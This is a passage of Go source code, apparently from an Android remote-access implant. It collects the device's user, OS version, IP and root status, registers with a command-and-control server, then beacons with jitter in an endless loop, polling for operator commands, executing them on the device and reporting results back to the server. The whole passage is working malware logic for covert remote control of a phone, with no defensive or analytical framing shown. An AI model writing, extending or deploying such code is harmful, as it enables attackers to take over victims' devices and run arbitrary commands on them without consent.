	user, _ := shellExec("whoami")
	osInfo := fmt.Sprintf("Android %s (SDK %s)", info["android_version"], info["sdk_version"])
	ip, _ := info["ip"].(string)

	// Register
	for i := 0; i < 5; i++ {
		err := c2.Register(deviceName, user, osInfo, ip, isRooted())
		if err == nil {
			break
		}
		time.Sleep(time.Duration(3*(i+1)) * time.Second)
	}

	// Main C2 loop
	beaconInterval := 5 * time.Second
	for {
		// Jitter: ±10%
		jitter := time.Duration(float64(beaconInterval) * (0.9 + rand.Float64()*0.2))
		time.Sleep(jitter)

		// Heartbeat
		c2.Heartbeat()

		// Poll commands
		cmds := c2.PollCommands()
		for _, cmd := range cmds {
			c2.UpdateCommand(cmd.ID, "executing", "")
			result, err := handleCommand(c2, jm, cmd)
			status := "complete"
			if err != nil {
				status = "failed"
			}
			c2.UpdateCommand(cmd.ID, status, result)
		}
	}
}
